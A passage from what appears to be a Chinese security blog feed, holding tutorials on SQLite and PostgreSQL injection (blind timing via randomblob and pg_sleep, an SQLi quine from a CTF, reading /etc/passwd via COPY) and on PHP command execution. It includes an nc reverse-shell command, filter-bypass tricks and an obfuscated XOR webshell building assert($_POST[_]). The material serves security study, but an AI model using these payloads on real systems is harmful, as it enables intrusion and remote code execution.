SECRET (id,fl4ggg) VALUES (1, "flag{Y1ng}");</code></pre><p>在<code>mysql</code>中查询库名、表名等有系统数据库<code>information_schema</code>，而在<code>sqlite</code>中则是表<code>sqlite_master</code></p><pre class="language-none"><code class="language-none">sqlite&gt; .schema sqlite_masterCREATE TABLE sqlite_master (  type text,  name text,  tbl_name text,  rootpage integer,  sql text);</code></pre><pre class="language-none"><code class="language-none">--查询表名sqlite&gt; SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';GIFTSECRET--注：这里之所以使用NOT like 'sqlite_%'，是避免出来系统的表，但是可能题目故意将表名弄成sqlite开头--查询列名sqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='GIFT';CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL)sqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='SECRET';CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL)</code></pre><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><p>与<code>mysql</code>类似，<code>sqlite</code>中也有字符串截取的函数</p><p><code>substr()、substring()、like、=、&gt;、&lt;、in、between</code>，这些与<code>mysql</code>差不多</p><p>而<code>sqlite</code>特有的</p><p><strong>TRIM</strong></p><pre class="language-none"><code class="language-none">TRIM (字符串,要移除的字符) 如果要移除的字符不写，默认是空格LTRIM 字符串开头部分移除RTRIM 字符串结尾部分移除--这个函数与mysql中的TRIM用法不一样sqlite&gt; select trim('aaaadsd','a');dsdsqlite&gt; select trim('aaaadsda','a');dsd可以通过特定的trim构造，实现right()和left()的功能sqlite&gt; select ltrim('casdasd','a') = ltrim("casdasd","c");0--通过ltrim去除字符与后一个trim判断相等，确定字符</code></pre><p><strong>printf(FORMAT,…)</strong></p><pre class="language-none"><code class="language-none">sqlite&gt; select printf('%.1s','aaaaa');asqlite&gt; select printf('%.2s','aaaaa');aasqlite&gt; select printf('%.3s','aaaaa');aaa--通过printf函数格式化操作对字符串截取</code></pre><p>通过<code>printf</code>判断长度</p><pre class="language-none"><code class="language-none">--如果printf('%.is', 'abc')=printf('%.i+1s', 'abc') 则说明字符串长度为isqlite&gt; select printf('%.5s','aaaaa') = printf('%.6s','aaaaa');1</code></pre><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><strong>GLOB</strong></p><p>运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回1。与LIKE 运算符不同的是，<strong>GLOB 是大小写敏感的</strong>，对于下面的通配符，它遵循UNIX 的语法。</p><ul><li>星号<code>*</code></li><li>问号<code>?</code></li><li>星号<code>*</code>代表零个、一个或多个数字或字符。问号<code>?</code>代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><p><strong>LIKE</strong></p><p><strong>LIKE</strong> 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，LIKE 运算符将返回真（true），也就是 1。这里有两个通配符与 LIKE 运算符一起使用</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li><li>百分号（%）代表零个、一个或多个数字或字符。下划线（_）代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><code>case when X then Y else Z end</code> 这个语句和<code>mysql</code>是相同的</li><li><code>iif(X,Y,Z)</code></li></ul><p>注意:</p><ol><li><code>sqlite</code>中没有<code>if</code>语句</li><li><code>iif</code>只有<code>version&gt;=3.32</code>可用</li></ol><pre class="language-none"><code class="language-none">sqlite&gt; select case when (1=1) then 1 else 0 end;1sqlite&gt; select case when (1=2) then 1 else 0 end;0--iif函数使用的版本比较高</code></pre><h2 id="构造报错"><a href="#构造报错" class="headerlink" title="构造报错"></a>构造报错</h2><p>在<code>mysql</code>中可以使用<code>exp(999999)</code>报错，但是<code>sqlite</code>中没有</p><p>在<code>sqlite</code>中使用<code>randomblob(N)</code>：返回<code>N-byte blob</code></p><pre class="language-none"><code class="language-none">sqlite&gt; select randomblob(1);sqlite&gt; select randomblob(2);�`sqlite&gt; select randomblob(3);~��sqlite&gt; select randomblob(4);�2q�--随机返回N个字节的字符--转化为十六进制看看sqlite&gt; select hex(randomblob(4));F8896FC0--当长度过长时报错sqlite&gt; select randomblob(10000000000);Error: string or blob too big</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><code>sqlite</code>中并没有<code>sleep()</code>这样的延时函数，通过<code>like</code>匹配和<code>RANDOMBLOB</code>组合延时</p><pre class="language-none"><code class="language-none">-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([秒]00000000/2))))sqlite&gt; select 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))));0--虽然没有像sleep那样精确，但是也够用了</code></pre><h2 id="SQLi-Quine"><a href="#SQLi-Quine" class="headerlink" title="SQLi-Quine"></a>SQLi-Quine</h2><p>在做CTF时可能遇见数据库里没有东西，但是却要求输入的与数据库查询的内容相等</p><pre class="language-none"><code class="language-none">row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();if(typeof row !== "undefined"){    req.session.isAdmin = (row.pw === user.pw);}else{    req.session.isAdmin = false;}</code></pre><p>上诉的<code>sql</code>语句要求输入的密码和查询的密码相等，在注入的过程中发现数据库没有东西。因此构造<code>payload</code></p><pre class="language-none"><code class="language-none">Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><pre class="language-none"><code class="language-none">sqlite&gt; select ''Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||');' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||sqlite&gt; select '' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--   ...&gt; ;' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><p>参考题目：ASIS CTF Quals 2020 Admin Panel</p><p>生成脚本参考：<a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p><h1 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h1><h2 id="注释符-2"><a href="#注释符-2" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-none"><code class="language-none">/**/--两种注释符 --后面不带空格 </code></pre><p>判断是<code>plsql</code>还是<code>sqlite</code></p><pre class="language-none"><code class="language-none">--可以注释，#不可注释，则不是mysql利用exp(999999)构造报错，可判断是PostgreSQL或者测试延时盲注利用pg_sleep()postgres=# select 123 where 123 = exp(9999999);ERROR:  value out of range: overflow</code></pre><h2 id="LIKE注入"><a href="#LIKE注入" class="headerlink" title="LIKE注入"></a>LIKE注入</h2><pre class="language-none"><code class="language-none">string LIKE pattern [ESCAPE escape-character]string NOT LIKE pattern [ESCAPE escape-character]</code></pre><p>在LIKE 子句中，通常与通配符结合使用，通配符表示任意字符，在PostgreSQL 中，主要有以下两种通配符（如果没有使用通配符，LIKE 子句和等号= 一样）：</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li></ul><p><code>_</code>匹配任意一个字符，<code>%</code>匹配0至多个任意字符。</p><p>下面是 LIKE 语句中演示了 <strong>%</strong> 和 <strong>_</strong> 的一些差别:</p><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>在 PostgreSQL 中，LIKE 子句是只能用于对字符进行比较，因此在上面例子中，我们要将整型数据类型转化为字符串数据类型。</p><p>根据活动的语言环境，可以使用关键字<code>ILIKE</code>代替<code>LIKE</code>来使匹配不区分大小写。这不是 SQL 标准，而是 PostgreSQL 扩展。</p><p>如果匹配的字符串中包含特殊字符，使用<code>escape ''</code>来选择转义任何字符</p><pre class="language-none"><code class="language-none">postgres=# select 'aaa%bbb' like 'aaa%'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%%' escape '1'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb_' escape '1'; ?column?---------- t(1 row)--可以看到使用escape之后，将1当作转义符</code></pre><p>如果<code>like</code>被过滤，可以使用<code>~~</code></p><pre class="language-none"><code class="language-none">postgres=# select '123' ~~ '1%'; ?column?---------- t(1 row)</code></pre><p>运算符<code>~~</code>等效于<code>LIKE</code>，而<code>~~*</code>对应于<code>ILIKE</code>。还有<code>!~~</code>和<code>!~~*</code>运算符分别代表<code>NOT LIKE</code>和<code>NOT ILIKE</code>。所有这些运算符都是特定于 PostgreSQL 的。您可能会在<code>EXPLAIN</code>输出和类似的位置看到这些运算符名称，因为解析器实际上翻译了<code>LIKE</code>等。这些运算符。</p><p><strong>类似还有****SIMILAR TO</strong></p><p><code>SIMILAR TO</code>运算符根据其模式是否与给定的字符串匹配而返回 true 或 false。它类似于<code>LIKE</code>，除了它使用 SQL 标准的正则表达式定义来解释模式。 SQL 正则表达式是<code>LIKE</code>表示法和通用正则表达式表示法之间的一个奇怪的交叉。</p><p>像<code>LIKE</code>一样，<code>SIMILAR TO</code>运算符仅在其模式与整个字符串匹配时才成功；这与常见的正则表达式行为不同，在常规行为中，模式可以匹配字符串的任何部分。与<code>LIKE</code>一样，<code>SIMILAR TO</code>使用<code>_</code>和<code>%</code>作为通配符，分别表示任何单个字符和任何字符串(在 POSIX 正则表达式中，它们分别与<code>.</code>和<code>.*</code>相类似)。</p><p>除了从<code>LIKE</code>借用的这些功能之外，<code>SIMILAR TO</code>还支持从 POSIX 正则表达式借用的这些模式匹配元字符：</p><ul><li><code>|</code>表示交替(两种选择之一)。</li><li><code>*</code>表示重复上一个项目零次或多次。</li><li><code>+</code>表示重复前一个项目一次或多次。</li><li><code>?</code>表示重复上一个项目零或一次。</li><li><code>{</code> <em>m</em> <code>MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN</code><em>HASH**表示前一项正好重复</em><code>m</code> *次。</li><li><code>{</code> <em>m</em> <code>,}</code>表示重复上一项 <em>m</em> 或更多次。</li><li><code>{</code> <em>m</em> <code>,</code> <em>n</em> <code>}</code>表示前一项重复至少 <em>m</em> 但不超过 <em>n</em> 次。</li><li>括号<code>()</code>可用于将项目分组为单个逻辑项目。</li><li>与 POSIX 正则表达式一样，方括号表达式<code>[...]</code>指定字符类。</li></ul><p>请注意，句点(<code>.</code>)不是<code>SIMILAR TO</code>的元字符。</p><p>与<code>LIKE</code>一样，反斜杠会禁用任何这些元字符的特殊含义；或可以使用<code>ESCAPE</code>指定其他转义字符。</p><p>Some examples:</p><pre class="language-none"><code class="language-none">'abc' SIMILAR TO 'abc'      true'abc' SIMILAR TO 'a'        false'abc' SIMILAR TO '%(b|d)%'  true'abc' SIMILAR TO '(b|c)%'   false</code></pre><h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><p><code>plsql</code>中并没有<code>group_concat()</code>这个函数，用聚合函数<code>array_agg()、string_agg()</code></p><pre class="language-none"><code class="language-none">--array_agg(expression) 把表达式变成一个数组postgres=# select array_agg(name) from company; array_agg----------- {Paul,cc}(1 row)--通常搭配array_to_string()使用postgres=# select array_to_string(array_agg(name),',') from company; array_to_string----------------- Paul,cc(1 row)</code></pre><pre class="language-none"><code class="language-none">--string_agg(expression, delimiter) 直接把一个表达式变成字符串postgres=# select string_agg(name,',')  from company; string_agg------------ Paul,cc(1 row)</code></pre><h2 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h2><p><code>pg_sleep(5)</code></p><p><strong>注意：</strong></p><pre class="language-none"><code class="language-none">--与mysql中的sleep()有所不同--当将pg_sleep()与布尔一起使用时会报错，因为pg_sleep返回值为空。postgres=# select '1' = pg_sleep(1);ERROR:  argument of AND must be type boolean, not type voidLINE 1: select '1' and pg_sleep(1);</code></pre><p>这里提供几种解决的办法</p><pre class="language-none"><code class="language-none">方法1：select xxx from pg_sleep(); --可以延时，并且返回xxxpostgres=# select 1 from pg_sleep(1); ?column?----------        1(1 row)--通过这个就有返回值，可以比较了postgres=# select '1'=(select '1' from pg_sleep(1)); ?column?---------- t(1 row)--可以看出plsql的数据类型比较严格，不会随意进行转换方法2：--通过类型转换，将数据转化为字符postgres=# select '1'=pg_sleep(1)::varchar; ?column?---------- f(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)::VARCHAR else 'a' end);方法3：--通过||--与mysql不一样，在plsql中，||是拼接字符串的意思postgres=# select '1'||'asss'; ?column?---------- 1asss(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)||'b' else 'a' end);</code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p><code>pg_ls_dir()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><p><code>pg_read_file()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><pre class="language-none"><code class="language-none">postgres=# select pg_ls_dir('/'); pg_ls_dir------------ home srv etc opt root lib mnt usr media lib64 sys dev sbin boot bin run lib32 libx32 init proc snap tmp var lost+found(24 rows)postgres=# select pg_ls_dir('/');                                       pg_read_file------------------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash                                                          + daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          + bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     + sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     + sync:x:4:65534:sync:/bin:/bin/sync                                                       + games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          + man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          + lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             + mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              + news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        + uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      + proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               + www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     + backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     + list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            + irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                         + gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        + nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                               + systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin   + systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin             + systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin+ messagebus:x:103:106::/nonexistent:/usr/sbin/nologin                                     + syslog:x:104:110::/home/syslog:/usr/sbin/nologin                                         + _apt:x:105:65534::/nonexistent:/usr/sbin/nologin                                         + tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                              + uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                            + tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin                                        +</code></pre><p><strong>堆叠注入时</strong></p><pre class="language-none"><code class="language-none">CREATE TABLE Y1ng(t TEXT);COPY Y1ng FROM '/etc/passwd';SELECT * FROM Y1ng limit 1 offset 0;  --通过偏移量读取某一行SELECT * FROM Y1ng limit 1 offset 1;SELECT * FROM Y1ng limit 1 offset 2;SELECT * FROM Y1ng limit 1 offset 3;SELECT * FROM Y1ng limit 1 offset 4;SELECT * FROM Y1ng limit 1 offset 5;--直接读取文件的全部内容：CREATE TABLE Y1ng(t TEXT);COPY Y1ng(t) FROM '/etc/passwd';SELECT * FROM Y1ng;</code></pre><p><strong>文件写入</strong></p><pre class="language-none"><code class="language-none">DROP TABLE Y1ng;CREATE TABLE Y1ng (t TEXT);INSERT INTO Y1ng(t) VALUES ('hello Y1ng');COPY Y1ng(t) TO '/tmp/Y1ng';</code></pre><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><p>在plsql中也存在库<code>information_schema</code></p><pre class="language-none"><code class="language-none">--查表名select table_name from information_schema.tables where table_name not like 'pg%' and table_schema='public';select table_name from information_schema.tables where table_name not like 'pg%';select string_agg(tablename, ',') from pg_tables where schemaname='public';--查列名select column_name from information_schema.columns where table_name like 'company';select string_agg(column_name, ',') from information_schema.columns where table_schema='public'(老版本)pg_class.oid对应pg_attribute.attrelidpg_class.relname表名pg_attribute.attname字段名select relname from pg_class获取表名select oid from pg_class wehre relname='admin'获取表的oidselect attname from pg_attribute where attrelid='oid的值'  获取字段名</code></pre><h2 id="plsql常用命令"><a href="#plsql常用命令" class="headerlink" title="plsql常用命令"></a>plsql常用命令</h2><pre class="language-none"><code class="language-none">select CURRENT_SCHEMA()           #查看当前权限select user                       #查看用户select current_user               #查看当前用户select chr(97)                    #将ASCII码转为字符select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串SELECT session_user;SELECT usename FROM pg_user;SELECT getpgusername();select version()                  #查看PostgreSQL数据库版本SELECT current_database()         #查看当前数据库select length('admin')            #查看长度</code></pre><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></p><p><a href="https://ccship.cn/tag/mysql%e6%b3%a8%e5%85%a5/">Mysql注入</a> <a href="https://ccship.cn/tag/postgresql%e6%b3%a8%e5%85%a5/">PostgreSQL注入</a> <a href="https://ccship.cn/tag/sqlite%e6%b3%a8%e5%85%a5/">Sqlite注入</a></p><p>0</p><p><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">Previous Post</a></p><h3 id="ysoserial使用方法"><a href="#ysoserial使用方法" class="headerlink" title="ysoserial使用方法"></a><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">ysoserial使用方法</a></h3><hr><p><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Next Post</a></p><h3 id="Java反序列化之Commons-Collectio"><a href="#Java反序列化之Commons-Collectio" class="headerlink" title="Java反序列化之Commons-Collectio"></a><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Java反序列化之Commons-Collectio</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞总结</title>
      <link href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p><p>系统命令执行</p><ol><li>system(args)–有回显</li><li>shell_exec(args)–无回显必须输出</li><li>passthru()</li><li>popen(handle,mode)–无回显</li><li>exec(args)–回显最后一行，必须加echo输出</li><li><strong>proc_open()</strong></li><li><strong>`(反单引号)</strong></li></ol><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><p>php代码执行</p><ol><li>assert()a</li><li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &amp;$count ]] )</li></ol><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串</p><ol><li>eval()</li><li>call_user_func (  $callback [, $parameter [, $… ]] )</li></ol><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p><ol><li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li></ol><p>把第一个参数作为<strong>回调函数<strong><strong>（</strong></strong>callback****）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入string </p><ol><li>create_function ( $args , $code )</li></ol><p>该函数的内部实现用到了<code>eval</code>。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p><ol><li>array_map ( callable $callback ,  $array1 [,  $… ] )</li></ol><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><p>示例</p><pre class="language-none"><code class="language-none">&lt;?php        $a = $_GET['chybeta'];        $b = create_function('$a',"echo $a");        $b('');?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo();&lt;?php        $array = array(0,1,2,3,4,5);        array_map($_GET['chybeta'],$array);?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p><p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p><p>如：ps aux | grep httpd</p><p><strong>（2）重定向</strong></p><p>改变执行命令时的默认输入输出</p><p>类型操作符用途</p><p>重定向输入                      &lt;                                  从指定文件读取数据而不是从键盘读取</p><p>重定向输出                     &gt;   或&gt;&gt;                      将输出结果覆盖、追加到指定文件（&gt;覆盖、&gt;&gt;追加）</p><p>重定向标准错误输出     2&gt;或 2&gt;&gt;                 将错误信息覆盖或追加到指定文件</p><p>重定向混合输出             &amp;&gt; 或 &amp;&gt;&gt;               将标准输出和错误信息覆盖或追加到指定文件</p><p><strong>（3)逻辑分割</strong></p><p>处理多条命令之间的逻辑关系</p><p>逻辑与                      &amp;&amp;      两条命令都要执行</p><p>逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）</p><p>顺序执行               ;              执行完第一条命令后执行第二条命令</p><p>作用</p><ol><li>读取敏感文件   /etc/passwd</li><li>NC反弹shell</li></ol><p>nc -e /bin/bash 127.0.0.1 3737</p><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash 是GNU操作系统的 shell 或命令语言解释器</p><h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF****绕过"></a><strong>WAF****绕过</strong></h2><h3 id="常见的替换"><a href="#常见的替换" class="headerlink" title="常见的替换"></a>常见的替换</h3><p>空格</p><blockquote><p>&gt;     &lt;       &lt;&gt;</p></blockquote><p>shell下特殊符号</p><p>$(base64编码内容|d -base64)</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p><pre class="language-none"><code class="language-none">*    代表『 0 个到无穷多个』任意字符?    代表『一定有一个』任意字符[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</code></pre><h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p><p>单引号</p><p>/‘b’i’n’/‘c’a’t’ /‘e’t’c’/‘p’a’s’s’w’d</p><p>双引号</p><p>/“b”i”n”/“w”h”i”c”h” “n”c</p><p>反斜杆</p><p>/b\i\n/w\h\i\c\h n\c</p><h3 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><ul><li><code>&lt;</code> 符号 <code>cat&lt;123</code></li><li><code>\t</code> / <code>%09</code></li><li><code>${IFS}</code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li></ul><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h4><ul><li><code>a=l;b=s;$a$b</code></li><li>base64 <code>echo "bHM=" | base64 -d</code></li><li><code>/?in/?s</code> =&gt; <code>/bin/ls</code></li><li>连接符 <code>cat /etc/pass'w'd</code></li><li>未定义的初始化变量 <code>cat$x /etc/passwd</code></li></ul><h2 id="无字母-数字-RCE"><a href="#无字母-数字-RCE" class="headerlink" title="无字母(数字)RCE"></a>无字母(数字)RCE</h2><p>推荐p神的文章–<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p><p>因为很多都是不可见的字符，所以说我就先url编码了一下</p><pre class="language-none"><code class="language-none">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'拼接起来：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);</code></pre><h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><p>有参数函数要分开运算</p><p>如</p><pre class="language-none"><code class="language-none">system('ls /');(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); 